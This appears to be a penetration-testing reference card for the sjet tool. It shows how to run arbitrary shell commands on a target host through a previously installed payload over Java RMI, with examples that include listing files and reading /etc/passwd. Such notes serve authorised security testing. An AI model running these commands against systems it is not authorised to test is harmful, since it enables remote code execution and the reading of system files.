---
id: d81ba1fe-e742-4a45-88f3-f01c1b3e68bd
name: sjet-execute-arbitrary-command-on-target
type: command
executor: bash
data: >-
  jython sjet.py $_TARGET_IP $_TARGET_PORT super_secret command
  "$_SHELL_COMMAND"
output: null
created_at: '2023-04-06T03:56:00.890524+00:00'
updated_at: '2023-04-06T03:56:00.908864+00:00'
platforms:
  - Linux
tags:
  - exploitation
  - rmi
  - rce
verified: true
validated: true
---

# sjet-execute-arbitrary-command-on-target

## Command

```bash
jython sjet.py $_TARGET_IP $_TARGET_PORT super_secret command "$_SHELL_COMMAND"
```

## Description

Executes a specified shell command on the target machine via the installed sjet payload over RMI.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target IP | Yes |
| $_TARGET_PORT | RMI port | Yes |
| super_secret | Payload name | Yes |
| command | Action to run command | Yes |
| $_SHELL_COMMAND | The command to execute (e.g., "ls -la") | Yes |

## Examples

### Basic Usage

```bash
jython sjet.py 192.168.1.100 1099 super_secret command "ls -la"
```

### Advanced Usage

```bash
jython sjet.py 192.168.1.100 1099 super_secret command "cat /etc/passwd"
```

## Expected Output

The stdout of the shell command, e.g., file listing or process output. Errors if payload not installed.

## Related

- [[procedures/Exploit-Java-RMI-for-RCE-Using-Sjet-or-Mjet]]
- [[commands/sjet-install-payload-on-target]]
